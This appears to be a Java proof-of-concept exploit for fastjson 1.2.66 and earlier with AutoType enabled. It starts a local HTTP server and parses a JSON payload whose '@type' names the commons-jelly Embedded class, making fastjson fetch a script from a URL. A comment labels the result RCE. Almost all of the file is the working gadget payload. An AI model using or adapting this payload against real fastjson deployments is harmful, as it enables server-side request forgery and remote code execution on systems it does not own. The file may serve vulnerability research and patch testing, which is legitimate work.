package com.threedr3am.bug.fastjson.ssrf;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.threedr3am.bug.common.server.HTTPServer;

/**
 * fastjson <= 1.2.66 RCE，需要开启AutoType (Discovered by threedr3am) 水
 *
 *
 * <dependency>
 *       <groupId>commons-jelly</groupId>
 *       <artifactId>commons-jelly</artifactId>
 *       <version>1.0.1</version>
 * </dependency>
 *
 * @author threedr3am
 */
public class CommonsJellySSRFPoc {

  static {
    HTTPServer.PORT = 23234;
    HTTPServer.run(null);
  }

  public static void main(String[] args) {
    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
    String payload = "{\"@type\":\"org.apache.commons.jelly.impl.Embedded\",\"script\": \"http://127.0.0.1:23234?aaaa=111&bb=242\"}";
    try {
      JSON.parse(payload);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
}
